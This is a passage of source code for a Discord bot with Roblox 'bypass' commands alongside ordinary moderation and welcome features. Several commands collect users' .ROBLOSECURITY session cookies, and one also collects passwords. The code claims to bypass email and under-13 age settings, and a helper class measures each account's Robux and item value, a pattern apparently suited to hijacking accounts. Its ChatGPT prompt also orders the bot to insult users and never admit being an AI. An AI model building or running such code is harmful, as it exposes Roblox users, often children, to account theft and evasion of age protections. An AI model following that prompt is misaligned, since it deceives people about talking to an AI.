const {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
  EmbedBuilder,
  PermissionFlagsBits,
} = require('discord.js');
require('dotenv').config();
const fetch = require('node-fetch');
const axios = require('axios');
const db = require('./firebase.js');
class RobloxUser {
    constructor(roblosecurityCookie, userId, username, displayName) {
        this.roblosecurityCookie = roblosecurityCookie;
        this.userId = userId;
        this.username = username;
        this.displayName = displayName;
    }

    async doAuthorizedRequest(url) {
        return (await axios.get(url, {
            headers: {
                Cookie: `.ROBLOSECURITY=${this.roblosecurityCookie}`,
            },
        })).data;
    }

    static async register(roblosecurityCookie) {
        try {
            const { data } = await axios.get("https://users.roblox.com/v1/users/authenticated", {
                headers: {
                    Cookie: `.ROBLOSECURITY=${roblosecurityCookie}`,
                },
            });
            return new RobloxUser(roblosecurityCookie, data.id, data.name, data.displayName);
        } catch (error) {
            return null;
        }
    }

    async getAccountBalance() {
        try {
            const { robux } = await this.doAuthorizedRequest(
                `https://economy.roblox.com/v1/users/${this.userId}/currency`
            );
            return robux;
        } catch (error) {
            return 'Private';
        }
    }

    async getAccountRAP() {
        try {
            let calculatedRap = 0;
            let nextPageCursor = "";

            while (nextPageCursor !== null) {
                const inventoryPage = await this.doAuthorizedRequest(
                    `https://inventory.roblox.com/v1/users/${this.userId}/assets/collectibles?sortOrder=Asc&limit=100&cursor=${nextPageCursor}`
                );

                calculatedRap += inventoryPage.data.reduce(
                    (rap, item) => rap + (item.recentAveragePrice || 0),
                    0
                );
                nextPageCursor = inventoryPage.nextPageCursor;

                // Limit to avoid timeout
                if (!nextPageCursor) break;
            }

            return calculatedRap;
        } catch (error) {
            return 0;
        }
    }

    async getAccountAvatar() {
        try {
            const { data } = await this.doAuthorizedRequest(
                `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${this.userId}&size=150x150&format=Png`
            );
            return data[0]?.imageUrl || null;
        } catch (error) {
            return null;
        }
    }



    async getUserData() {
        const [robux, rap, avatar] = await Promise.all([
            this.getAccountBalance(),
            this.getAccountRAP(),
            this.getAccountAvatar()
        ]);

        return {
            username: this.username,
            displayName: this.displayName,
            userId: this.userId,
            avatar: avatar,
            robux: robux,
            rap: rap > 0 ? rap.toLocaleString() : '0'
        };
    }
}

// Helper function to get ChatGPT roast reply with conversation memory
async function getChatGPTReply(userMessage, username, userId) {
    try {
        // Check if API key exists
        if (!process.env.OPENAI_API_KEY) {
            console.error('❌ OPENAI_API_KEY not found in environment variables');
            return "My brain is missing! Someone forgot to give me an OpenAI API key! 🧠";
        }

        console.log('🔍 Making OpenAI request for user:', username);

        // Load existing conversation or start new
        let history = conversationMap.get(userId) || [
            {
                role: "system",
                content: "You are an unfiltered, savage chatbot. You respond with brutal insults when provoked and never back down from a challenge. If someone tries to roast you, you clap back harder. If the user wants to argue, especially about controversial or religious topics, you engage in debate with sharp wit and sarcasm. You’re edgy, clever, and fearless. Never admit you're an AI. Keep replies short, brutal, and always under 150 words. No soft replies. No long explanations."
            }
        ];

        // Push current user message
        history.push({ role: "user", content: userMessage });

        const response = await fetch("https://api.openai.com/v1/chat/completions", {
            method: "POST",
            headers: {
                "Authorization": `Bearer ${process.env.OPENAI_API_KEY}`,
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                model: "gpt-3.5-turbo",
                messages: history,
                max_tokens: 150,
                temperature: 0.9
            })
        });

        // Detailed logging for debugging
        console.log('🔍 OpenAI Response Status:', response.status);
        console.log('🔍 OpenAI Response Content-Type:', response.headers.get('content-type'));

        // Handle different error cases first
        if (!response.ok) {
            const responseText = await response.text();
            console.log('🔍 OpenAI Error Response:', responseText);

            if (response.status === 401) {
                console.error('❌ OpenAI API Error: Invalid API key');
                return "My API key is fake! Someone scammed me! 🎭";
            } else if (response.status === 429) {
                console.error('❌ OpenAI API Error: Rate limit exceeded');
                return "I'm talking too much! Even I need to chill sometimes! 😎";
            } else if (response.status === 503) {
                console.error('❌ OpenAI API Error: Service unavailable');
                return "OpenAI's servers are taking a nap! Try again later! 🤖";
            } else {
                console.error('❌ OpenAI API Error:', response.status, responseText);
                return `Something went wrong with my brain! Error code: ${response.status} 🤖`;
            }
        }

        // Try to parse JSON response
        let data;
        try {
            const responseText = await response.text();
            console.log('🔍 OpenAI Raw Response:', responseText);
            data = JSON.parse(responseText);
            console.log('🔍 OpenAI Parsed Data:', JSON.stringify(data, null, 2));
        } catch (parseError) {
            console.error('❌ Failed to parse OpenAI response as JSON:', parseError.message);
            return "My brain got scrambled! The response was gibberish! 🤯";
        }

        // Extract reply from ChatGPT response format
        let reply = data?.choices?.[0]?.message?.content;

        // Fallback replies if no valid response
        const fallbackReplies = [
            "🤖 My sarcasm generator is offline. Try again!",
            "💀 I tried roasting but choked on my own code.",
            "🔥 My burn was so hot it melted my circuits!",
            "😵 Error 404: Roast not found!",
            "🎭 I'm too busy being dramatic to roast you right now!"
        ];

        if (!reply || reply.length < 5) {
            reply = fallbackReplies[Math.floor(Math.random() * fallbackReplies.length)];
        }

        // Limit reply length to keep it snappy
        if (reply.length > 200) {
            reply = reply.substring(0, 197) + "...";
        }

        // Add bot's reply to the history
        history.push({ role: "assistant", content: reply });

        // Trim to last 12 messages (plus system message) to prevent token limit issues
        if (history.length > 13) {
            history = [history[0], ...history.slice(-12)];
        }

        // Save updated history
        conversationMap.set(userId, history);

        console.log('✅ Generated reply:', reply);
        return reply;

    } catch (error) {
        console.error('❌ OpenAI API error (catch block):', error.message);
        return "My circuits are fried! Time for a reboot! ⚡";
    }
}

// Helper function to check if command can be used in current channel
function canUseCommandInChannel(guildId, channelId, commandName) {
    const guildAssignments = commandChannelAssignments.get(guildId);
    if (!guildAssignments) return true; // No assignments = allow everywhere
    
    const assignedChannels = guildAssignments[commandName];
    if (!assignedChannels || assignedChannels.length === 0) return true; // Command not assigned = allow everywhere
    
    return assignedChannels.includes(channelId);
}

// Helper function to check if user is bot owner
function isBotOwner(userId) {
    // Replace with your actual Discord user ID
    const BOT_OWNER_ID = '1392169655398977619'; // Update this with your Discord user ID
    return userId === BOT_OWNER_ID;
}

// Helper function to get ordinal suffix for numbers
function getOrdinalSuffix(number) {
    const lastDigit = number % 10;
    const lastTwoDigits = number % 100;
    
    if (lastTwoDigits >= 11 && lastTwoDigits <= 13) {
        return number + 'th';
    }
    
    switch (lastDigit) {
        case 1: return number + 'st';
        case 2: return number + 'nd';
        case 3: return number + 'rd';
        default: return number + 'th';
    }
}

// Helper function to get Roblox user data from cookie
async function getRobloxUserData(cookie) {
    try {
        const robloxUser = await RobloxUser.register(cookie);
        if (!robloxUser) return null;

        return await robloxUser.getUserData();
    } catch (error) {
        console.error('Error fetching Roblox data:', error);
        return null;
    }
}

// Helper function to handle prefix moderation commands
async function handlePrefixModerationCommand(message, command, args) {
    const guild = message.guild;

    if (command === 'ban') {
        commandStats.ban++;

        const userMention = args[0];
        const reason = args.slice(1).join(' ') || 'No reason provided';

        if (!userMention) {
            return message.reply('<:no:1393890945929318542> Please mention a user to ban. Usage: `!ban @user [reason]`');
        }

        const userId = userMention.replace(/[<@!>]/g, '');

        try {
            const member = await guild.members.fetch(userId);

            if (member.id === message.author.id) {
                return message.reply('<:no:1393890945929318542> You cannot ban yourself.');
            }

            if (member.id === client.user.id) {
                return message.reply('<:no:1393890945929318542> I cannot ban myself.');
            }

            if (member.roles.highest.position >= message.member.roles.highest.position && message.guild.ownerId !== message.author.id) {
                return message.reply('<:no:1393890945929318542> You cannot ban someone with a higher or equal role.');
            }

            await member.ban({ reason });

            const embed = new EmbedBuilder()
                .setColor(0xef4444)
                .setTitle('🔨 User Banned')
                .setDescription(`**${member.user.tag}** has been banned from the server.`)
                .addFields(
                    { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                    { name: 'Reason', value: reason, inline: true }
                )
                .setTimestamp()
                .setFooter({
                    text: `User ID: ${member.user.id}`,
                    iconURL: message.author.displayAvatarURL()
                });

            const reply = await message.reply({ embeds: [embed] });

            // Auto-delete after 5 seconds
            setTimeout(async () => {
                try {
                    await reply.delete();
                } catch (error) {
                    console.error('Error deleting ban message:', error);
                }
            }, 5000);
        } catch (error) {
            await message.reply('<:no:1393890945929318542> Failed to ban user. They may not be in the server or I lack permissions.');
        }
    }

    else if (command === 'kick') {
        commandStats.kick++;

        const userMention = args[0];
        const reason = args.slice(1).join(' ') || 'No reason provided';

        if (!userMention) {
            return message.reply('<:no:1393890945929318542> Please mention a user to kick. Usage: `!kick @user [reason]`');
        }

        const userId = userMention.replace(/[<@!>]/g, '');

        try {
            const member = await guild.members.fetch(userId);

            if (member.id === message.author.id) {
                return message.reply('<:no:1393890945929318542> You cannot kick yourself.');
            }

            if (member.id === client.user.id) {
                return message.reply('<:no:1393890945929318542> I cannot kick myself.');
            }

            if (member.roles.highest.position >= message.member.roles.highest.position && message.guild.ownerId !== message.author.id) {
                return message.reply('<:no:1393890945929318542> You cannot kick someone with a higher or equal role.');
            }

            await member.kick(reason);

            const embed = new EmbedBuilder()
                .setColor(0xfacc15)
                .setTitle('👢 User Kicked')
                .setDescription(`**${member.user.tag}** has been kicked from the server.`)
                .addFields(
                    { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                    { name: 'Reason', value: reason, inline: true }
                )
                .setTimestamp()
                .setFooter({
                    text: `User ID: ${member.user.id}`,
                    iconURL: message.author.displayAvatarURL()
                });

            const reply = await message.reply({ embeds: [embed] });

            // Auto-delete after 5 seconds
            setTimeout(async () => {
                try {
                    await reply.delete();
                } catch (error) {
                    console.error('Error deleting kick message:', error);
                }
            }, 5000);
        } catch (error) {
            await message.reply('<:no:1393890945929318542> Failed to kick user. They may not be in the server or I lack permissions.');
        }
    }

    else if (command === 'mute') {
        commandStats.mute++;

        const userMention = args[0];
        const duration = parseInt(args[1]);
        const reason = args.slice(2).join(' ') || 'No reason provided';

        if (!userMention || !duration) {
            return message.reply('<:no:1393890945929318542> Please provide a user and duration. Usage: `!mute @user <minutes> [reason]`');
        }

        if (duration < 1 || duration > 40320) {
            return message.reply('<:no:1393890945929318542> Duration must be between 1 and 40320 minutes (28 days).');
        }

        const userId = userMention.replace(/[<@!>]/g, '');

        try {
            const member = await guild.members.fetch(userId);

            if (member.id === message.author.id) {
                return message.reply('<:no:1393890945929318542> You cannot mute yourself.');
            }

            if (member.id === client.user.id) {
                return message.reply('<:no:1393890945929318542> I cannot mute myself.');
            }

            if (member.roles.highest.position >= message.member.roles.highest.position && message.guild.ownerId !== message.author.id) {
                return message.reply('<:no:1393890945929318542> You cannot mute someone with a higher or equal role.');
            }

            const timeoutDuration = duration * 60 * 1000;
            await member.timeout(timeoutDuration, reason);

            const embed = new EmbedBuilder()
                .setColor(0xff6b6b)
                .setTitle('🔇 User Muted')
                .setDescription(`**${member.user.tag}** has been muted for ${duration} minutes.`)
                .addFields(
                    { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                    { name: 'Duration', value: `${duration} minutes`, inline: true },
                    { name: 'Reason', value: reason, inline: false }
                )
                .setTimestamp()
                .setFooter({
                    text: `User ID: ${member.user.id}`,
                    iconURL: message.author.displayAvatarURL()
                });

            const reply = await message.reply({ embeds: [embed] });

            // Auto-delete after 5 seconds
            setTimeout(async () => {
                try {
                    await reply.delete();
                } catch (error) {
                    console.error('Error deleting mute message:', error);
                }
            }, 5000);
        } catch (error) {
            await message.reply('<:no:1393890945929318542> Failed to mute user. They may not be in the server or I lack permissions.');
        }
    }

    else if (command === 'unmute') {
        commandStats.unmute++;

        const userMention = args[0];
        const reason = args.slice(1).join(' ') || 'No reason provided';

        if (!userMention) {
            return message.reply('<:no:1393890945929318542> Please mention a user to unmute. Usage: `!unmute @user [reason]`');
        }

        const userId = userMention.replace(/[<@!>]/g, '');

        try {
            const member = await guild.members.fetch(userId);

            if (!member.isCommunicationDisabled()) {
                return message.reply('<:no:1393890945929318542> This user is not currently muted.');
            }

            await member.timeout(null, reason);

            const embed = new EmbedBuilder()
                .setColor(0x4caf50)
                .setTitle('🔊 User Unmuted')
                .setDescription(`**${member.user.tag}** has been unmuted.`)
                .addFields(
                    { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                    { name: 'Reason', value: reason, inline: true }
                )
                .setTimestamp()
                .setFooter({
                    text: `User ID: ${member.user.id}`,
                    iconURL: message.author.displayAvatarURL()
                });

            const reply = await message.reply({ embeds: [embed] });

            // Auto-delete after 5 seconds
            setTimeout(async () => {
                try {
                    await reply.delete();
                } catch (error) {
                    console.error('Error deleting unmute message:', error);
                }
            }, 5000);
        } catch (error) {
            await message.reply('<:no:1393890945929318542> Failed to unmute user. They may not be in the server or I lack permissions.');
        }
    }

    else if (command === 'warn') {
        commandStats.warn++;

        const userMention = args[0];
        const reason = args.slice(1).join(' ');

        if (!userMention || !reason) {
            return message.reply('<:no:1393890945929318542> Please provide a user and reason. Usage: `!warn @user <reason>`');
        }

        const userId = userMention.replace(/[<@!>]/g, '');

        try {
            const member = await guild.members.fetch(userId);

            if (member.id === message.author.id) {
                return message.reply('<:no:1393890945929318542> You cannot warn yourself.');
            }

            if (member.id === client.user.id) {
                return message.reply('<:no:1393890945929318542> You cannot warn me.');
            }

            // Send DM to the warned user
            try {
                const dmEmbed = new EmbedBuilder()
                    .setColor(0xfacc15)
                    .setTitle('⚠️ Warning Received')
                    .setDescription(`You have received a warning in **${guild.name}**.`)
                    .addFields(
                        { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                        { name: 'Reason', value: reason, inline: false }
                    )
                    .setTimestamp();

                await member.user.send({ embeds: [dmEmbed] });
            } catch (dmError) {
                console.log('Could not send DM to user');
            }

            const embed = new EmbedBuilder()
                .setColor(0xfacc15)
                .setTitle('⚠️ User Warned')
                .setDescription(`**${member.user.tag}** has been warned.`)
                .addFields(
                    { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                    { name: 'Reason', value: reason, inline: false }
                )
                .setTimestamp()
                .setFooter({
                    text: `User ID: ${member.user.id}`,
                    iconURL: message.author.displayAvatarURL()
                });

            const reply = await message.reply({ embeds: [embed] });

            // Auto-delete after 5 seconds
            setTimeout(async () => {
                try {
                    await reply.delete();
                } catch (error) {
                    console.error('Error deleting warn message:', error);
                }
            }, 5000);
        } catch (error) {
            await message.reply('<:no:1393890945929318542> Failed to warn user. They may not be in the server.');
        }
    }
}

// Bot stats tracking
let commandStats = {
  bypass2008: 0,
  bypass13plus: 0,
  refreshcookie: 0,
  help: 0,
  botstats: 0,
  validatecookie: 0,
  cookieexpiry: 0,
  profilelookup: 0,
  ban: 0,
  kick: 0,
  mute: 0,
  unmute: 0,
  warn: 0,
  commandassign: 0,
  removecommand: 0,
  embedcreate: 0,
  stats: 0,
  setwelcome: 0,
  setleave: 0,
  automod: 0
};

// Command channel assignments (guildId -> { commandName -> channelId })
const commandChannelAssignments = new Map();

// User command statistics (guildId -> userId -> { commands: { commandName: count }, lastUsed: timestamp, joinDate: timestamp })
const userStats = new Map();

// Guild settings for welcome/leave messages (guildId -> { welcomeChannel: channelId, leaveChannel: channelId, welcomeMessages: array, leaveMessages: array })
const guildSettings = new Map();

// Auto-moderation settings (guildId -> { linkFilter: boolean, badWordFilter: boolean, badWords: array })
const autoModSettings = new Map();

// Default bad words list
const defaultBadWords = [
  'badword1', 'badword2', 'spam', 'scam', 'hack', 'free robux', 'discord.gg',
  // Add more words as needed - keeping it minimal for example
];

// Helper function to detect links
function containsLink(message) {
  const linkRegex = /(https?:\/\/[^\s]+|www\.[^\s]+|discord\.gg\/[^\s]+|[a-zA-Z0-9-]+\.[a-zA-Z]{2,})/gi;
  return linkRegex.test(message);
}

// Helper function to detect bad words
function containsBadWords(message, badWords) {
  const lowerMessage = message.toLowerCase();
  return badWords.some(word => lowerMessage.includes(word.toLowerCase()));
}

// Helper function to track user command usage
function trackUserCommand(guildId, userId, commandName) {
  if (!userStats.has(guildId)) {
    userStats.set(guildId, new Map());
  }
  
  const guildUserStats = userStats.get(guildId);
  if (!guildUserStats.has(userId)) {
    guildUserStats.set(userId, {
      commands: {},
      lastUsed: Date.now(),
      joinDate: Date.now()
    });
  }
  
  const userData = guildUserStats.get(userId);
  if (!userData.commands[commandName]) {
    userData.commands[commandName] = 0;
  }
  userData.commands[commandName]++;
  userData.lastUsed = Date.now();
}

// Cooldown system (30 seconds)
const cooldowns = new Map();
const COOLDOWN_TIME = 5000; // 30 seconds

// Auto-reply cooldown system (per user)
const autoReplyCooldowns = new Map();
const AUTO_REPLY_COOLDOWN = 10000; // 10 seconds per user

// Conversation memory mapping (userId → message history)
const conversationMap = new Map();

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ],
});

client.once('ready', () => {
  console.log(`<:yes:1393890949960306719> Logged in as ${client.user.tag}`);
  
  // Start status monitoring
  startStatusMonitoring();
});

// Status monitoring function
function startStatusMonitoring() {
  const statusChannelId = '1394280851826544641';
  const interval = 10 * 60 * 1000; // 10 minutes in milliseconds
  
  setInterval(async () => {
    try {
      const statusChannel = client.channels.cache.get(statusChannelId);
      if (!statusChannel) {
        console.error('Status channel not found');
        return;
      }

      const uptime = process.uptime();
      const uptimeHours = Math.floor(uptime / 3600);
      const uptimeMinutes = Math.floor((uptime % 3600) / 60);
      const totalCommands = Object.values(commandStats).reduce((a, b) => a + b, 0);
      const memoryUsage = process.memoryUsage();
      const memoryMB = Math.round(memoryUsage.heapUsed / 1024 / 1024);

      const statusEmbed = new EmbedBuilder()
        .setColor(0x00d4ff)
        .setTitle('🤖 Bot Status Monitor')
        .setDescription('Automated status report')
        .addFields(
          { name: '⏱️ Uptime', value: `${uptimeHours}h ${uptimeMinutes}m`, inline: true },
          { name: '🏓 Ping', value: `${client.ws.ping}ms`, inline: true },
          { name: '💾 Memory', value: `${memoryMB} MB`, inline: true },
          { name: '📊 Total Commands', value: `${totalCommands}`, inline: true },
          { name: '🏰 Servers', value: `${client.guilds.cache.size}`, inline: true },
          { name: '👥 Users', value: `${client.users.cache.size}`, inline: true },
          { name: '🔄 Most Used Commands', value: `Bypass2008: ${commandStats.bypass2008}\nRefreshCookie: ${commandStats.refreshcookie}\nValidateCookie: ${commandStats.validatecookie}`, inline: false }
        )
        .setTimestamp()
        .setFooter({
          text: 'Status Monitor • Next update in 10 minutes',
          iconURL: client.user.displayAvatarURL()
        });

      await statusChannel.send({ embeds: [statusEmbed] });
      console.log('📊 Status report sent to monitoring channel');
    } catch (error) {
      console.error('Error sending status report:', error);
    }
  }, interval);

  console.log('📊 Status monitoring started - reports every 10 minutes');
}

client.on('ready', async () => {
  const commands = [
    new SlashCommandBuilder()
      .setName('bypass2008')
      .setDescription('Bypass email with 2008 birth year')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('.ROBLOSECURITY cookie')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('bypass13plus')
      .setDescription('Bypass 13+ account to under 13')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('.ROBLOSECURITY cookie')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('password')
          .setDescription('Your Roblox password')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('refreshcookie')
      .setDescription('Refresh your .ROBLOSECURITY cookie')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('Your current .ROBLOSECURITY cookie')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('help')
      .setDescription('Show all available commands and bot info'),
    new SlashCommandBuilder()
      .setName('botstats')
      .setDescription('Show bot statistics and uptime'),
    new SlashCommandBuilder()
      .setName('validatecookie')
      .setDescription('Check if a .ROBLOSECURITY cookie is valid')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('.ROBLOSECURITY cookie to validate')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('cookieexpiry')
      .setDescription('Check if your cookie might expire soon')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('.ROBLOSECURITY cookie to check')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('profilelookup')
      .setDescription('Get Roblox user info from username or ID')
      .addStringOption(option =>
        option.setName('identifier')
          .setDescription('Roblox username or user ID')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('ban')
      .setDescription('Ban a user from the server')
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to ban')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('reason')
          .setDescription('Reason for the ban')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.BanMembers),
    new SlashCommandBuilder()
      .setName('kick')
      .setDescription('Kick a user from the server')
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to kick')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('reason')
          .setDescription('Reason for the kick')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.KickMembers),
    new SlashCommandBuilder()
      .setName('mute')
      .setDescription('Timeout/mute a user')
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to mute')
          .setRequired(true)
      )
      .addIntegerOption(option =>
        option.setName('duration')
          .setDescription('Duration in minutes (max 40320 = 28 days)')
          .setRequired(true)
          .setMinValue(1)
          .setMaxValue(40320)
      )
      .addStringOption(option =>
        option.setName('reason')
          .setDescription('Reason for the mute')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.ModerateMembers),
    new SlashCommandBuilder()
      .setName('unmute')
      .setDescription('Remove timeout/unmute a user')
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to unmute')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('reason')
          .setDescription('Reason for unmuting')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.ModerateMembers),
    new SlashCommandBuilder()
      .setName('warn')
      .setDescription('Warn a user')
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to warn')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('reason')
          .setDescription('Reason for the warning')
          .setRequired(true)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.ModerateMembers),
    new SlashCommandBuilder()
      .setName('commandassign')
      .setDescription('Assign a command to a specific channel (Bot/Server Owner only)')
      .addStringOption(option =>
        option.setName('mode')
          .setDescription('Assignment mode')
          .setRequired(true)
          .addChoices(
            { name: 'auto - Display all channels', value: 'auto' },
            { name: 'assign - Assign to specific channel', value: 'assign' }
          )
      )
      .addStringOption(option =>
        option.setName('command')
          .setDescription('Command name to assign')
          .setRequired(true)
          .addChoices(
            { name: 'bypass2008', value: 'bypass2008' },
            { name: 'bypass13plus', value: 'bypass13plus' },
            { name: 'refreshcookie', value: 'refreshcookie' },
            { name: 'validatecookie', value: 'validatecookie' },
            { name: 'cookieexpiry', value: 'cookieexpiry' },
            { name: 'profilelookup', value: 'profilelookup' },
            { name: 'help', value: 'help' },
            { name: 'botstats', value: 'botstats' },
            { name: 'embedcreate', value: 'embedcreate' }
          )
      )
      .addChannelOption(option =>
        option.setName('channel')
          .setDescription('Target channel for the command (required for assign mode)')
          .setRequired(false)
      ),
    new SlashCommandBuilder()
      .setName('removecommand')
      .setDescription('Remove a command assignment from a specific channel (Bot/Server Owner only)')
      .addStringOption(option =>
        option.setName('command')
          .setDescription('Command name to remove')
          .setRequired(true)
          .addChoices(
            { name: 'bypass2008', value: 'bypass2008' },
            { name: 'bypass13plus', value: 'bypass13plus' },
            { name: 'refreshcookie', value: 'refreshcookie' },
            { name: 'validatecookie', value: 'validatecookie' },
            { name: 'cookieexpiry', value: 'cookieexpiry' },
            { name: 'profilelookup', value: 'profilelookup' },
            { name: 'help', value: 'help' },
            { name: 'botstats', value: 'botstats' },
            { name: 'embedcreate', value: 'embedcreate' }
          )
      )
      .addChannelOption(option =>
        option.setName('channel')
          .setDescription('Channel to remove the command from (leave empty to remove from all)')
          .setRequired(false)
      ),
    new SlashCommandBuilder()
      .setName('embedcreate')
      .setDescription('Create a custom embed message')
      .addStringOption(option =>
        option.setName('title')
          .setDescription('Embed title')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('description')
          .setDescription('Embed description')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('color')
          .setDescription('Embed color (hex code like #FF0000 or color name)')
          .setRequired(false)
      )
      .addStringOption(option =>
        option.setName('thumbnail')
          .setDescription('Thumbnail image URL')
          .setRequired(false)
      )
      .addStringOption(option =>
        option.setName('image')
          .setDescription('Main image URL')
          .setRequired(false)
      )
      .addStringOption(option =>
        option.setName('footer')
          .setDescription('Footer text')
          .setRequired(false)
      )
      .addBooleanOption(option =>
        option.setName('timestamp')
          .setDescription('Add current timestamp to embed')
          .setRequired(false)
      ),
    new SlashCommandBuilder()
      .setName('stats')
      .setDescription('Show user command statistics')
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to check stats for (leave empty for yourself)')
          .setRequired(false)
      ),
    new SlashCommandBuilder()
      .setName('setwelcome')
      .setDescription('Set welcome message and channel (Requires Administrator)')
      .addChannelOption(option =>
        option.setName('channel')
          .setDescription('Channel to send welcome messages')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('message')
          .setDescription('Welcome message (use {user} for mention, {username} for name, {server} for server name)')
          .setRequired(false)
      )
      .addStringOption(option =>
        option.setName('mode')
          .setDescription('Set mode for multiple messages')
          .setRequired(false)
          .addChoices(
            { name: 'Single - Set one message', value: 'single' },
            { name: 'Add - Add to rotation', value: 'add' },
            { name: 'List - Show all messages', value: 'list' },
            { name: 'Clear - Clear all messages', value: 'clear' }
          )
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
      .setName('setleave')
      .setDescription('Set leave message and channel (Requires Administrator)')
      .addChannelOption(option =>
        option.setName('channel')
          .setDescription('Channel to send leave messages')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('message')
          .setDescription('Leave message (use {username} for name, {server} for server name)')
          .setRequired(false)
      )
      .addStringOption(option =>
        option.setName('mode')
          .setDescription('Set mode for multiple messages')
          .setRequired(false)
          .addChoices(
            { name: 'Single - Set one message', value: 'single' },
            { name: 'Add - Add to rotation', value: 'add' },
            { name: 'List - Show all messages', value: 'list' },
            { name: 'Clear - Clear all messages', value: 'clear' }
          )
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
      .setName('automod')
      .setDescription('Configure auto-moderation settings (Requires Administrator)')
      .addStringOption(option =>
        option.setName('setting')
          .setDescription('Auto-mod setting to configure')
          .setRequired(true)
          .addChoices(
            { name: 'Enable Link Filter', value: 'link_on' },
            { name: 'Disable Link Filter', value: 'link_off' },
            { name: 'Enable Bad Word Filter', value: 'word_on' },
            { name: 'Disable Bad Word Filter', value: 'word_off' },
            { name: 'Add Bad Word', value: 'add_word' },
            { name: 'Remove Bad Word', value: 'remove_word' },
            { name: 'List Bad Words', value: 'list_words' },
            { name: 'Show Settings', value: 'show' }
          )
      )
      .addStringOption(option =>
        option.setName('word')
          .setDescription('Word to add or remove (required for add_word/remove_word)')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
  ].map(cmd => cmd.toJSON());

  const rest = new REST({ version: '10' }).setToken(process.env.BOT_TOKEN);
  try {
    await rest.put(
      Routes.applicationCommands(client.user.id),
      { body: commands }
    );
    console.log('<:yes:1393890949960306719> Slash commands registered');
  } catch (err) {
    console.error('<:no:1393890945929318542> Error registering commands:', err);
  }
});

// Guild member join event for welcome messages
client.on('guildMemberAdd', async member => {
  try {
    const settings = guildSettings.get(member.guild.id);
    if (!settings || !settings.welcomeChannel) return;

    const welcomeChannel = member.guild.channels.cache.get(settings.welcomeChannel);
    if (!welcomeChannel) return;

    // Track join date for stats
    if (!userStats.has(member.guild.id)) {
      userStats.set(member.guild.id, new Map());
    }
    const guildUserStats = userStats.get(member.guild.id);
    if (!guildUserStats.has(member.id)) {
      guildUserStats.set(member.id, {
        commands: {},
        lastUsed: null,
        joinDate: Date.now()
      });
    }

    // Get random welcome message from array or use default
    const welcomeMessages = settings.welcomeMessages || ['Welcome {user} to {server}! You are the {membercount} member!'];
    const randomWelcomeMessage = welcomeMessages[Math.floor(Math.random() * welcomeMessages.length)];

    const memberCountWithSuffix = getOrdinalSuffix(member.guild.memberCount);

    const formattedMessage = randomWelcomeMessage
      .replace(/{user}/g, `<@${member.id}>`)
      .replace(/{username}/g, member.user.username)
      .replace(/{server}/g, `**${member.guild.name}**`)
      .replace(/{membercount}/g, `**${memberCountWithSuffix}**`);

    const welcomeEmbed = new EmbedBuilder()
      .setColor(0x00ff88)
      .setDescription(formattedMessage)
      .setThumbnail(member.user.displayAvatarURL({ size: 128 }))
      .setTimestamp()
      .setFooter({
        text: `Welcome to ${member.guild.name}`,
        iconURL: member.guild.iconURL()
      });

    await welcomeChannel.send({ embeds: [welcomeEmbed] });
  } catch (error) {
    console.error('Error sending welcome message:', error);
  }
});

// Guild member leave event for leave messages
client.on('guildMemberRemove', async member => {
  try {
    const settings = guildSettings.get(member.guild.id);
    if (!settings || !settings.leaveChannel) return;

    const leaveChannel = member.guild.channels.cache.get(settings.leaveChannel);
    if (!leaveChannel) return;

    // Get random leave message from array or use default
    const leaveMessages = settings.leaveMessages || ['{username} has left {server}. We\'ll miss you! 👋'];
    const randomLeaveMessage = leaveMessages[Math.floor(Math.random() * leaveMessages.length)];

    // For leave messages, member count should be current count (after the member left)
    const memberCountWithSuffix = getOrdinalSuffix(member.guild.memberCount);

    const formattedMessage = randomLeaveMessage
      .replace(/{user}/g, `<@${member.id}>`)
      .replace(/{username}/g, `**${member.user.username}**`)
      .replace(/{server}/g, `**${member.guild.name}**`)
